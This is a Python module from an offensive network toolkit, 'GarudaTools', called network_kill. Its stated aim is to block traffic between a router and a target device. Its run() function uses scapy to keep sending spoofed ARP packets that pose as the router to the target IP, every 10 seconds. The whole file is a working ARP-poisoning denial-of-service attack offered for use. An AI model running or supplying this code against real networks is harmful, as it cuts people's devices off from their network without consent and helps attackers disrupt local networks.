#        Copyright (C) 2017 M4st3r L1nux Indonesia (Jh0n 1sl4nskh4_404)

from core.GarudaTools import *
import os
import signal
from time import sleep
import logging
from scapy.all import *
from core import colors

conf = {
	"name": "network_kill",
	"version": "1.0",
	"shortdesc": "blocks communication between router and target",
	"author": "M4st3rL1nux",
	"github": "JhonIslanskha",
	"by": "Jh0n 1sl4nskh4_404",
	"initdate": "24.2.2016",
	"lastmod": "26.5.2017",
	"apisupport": False,
	"needroot": 1
}

# List of variables
variables = OrderedDict((
	('target', ['192.168.1.2', "target device's ip"]),
	('router', ['192.168.1.1', "router's ip"]),
))

# Additional help notes
help_notes = colors.red+"this module will not work without root permission!\n this doesn't work if target refuses from arp request!"+colors.end

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	printInfo("arp poisoning has been started!")
	printInfo("[*] ctrl + c to end")
	packet = ARP()
	packet.psrc = variables['router'][0]
	packet.pdst = variables['target'][0]
	while 1:
		send(packet, verbose=False)
		sleep(10)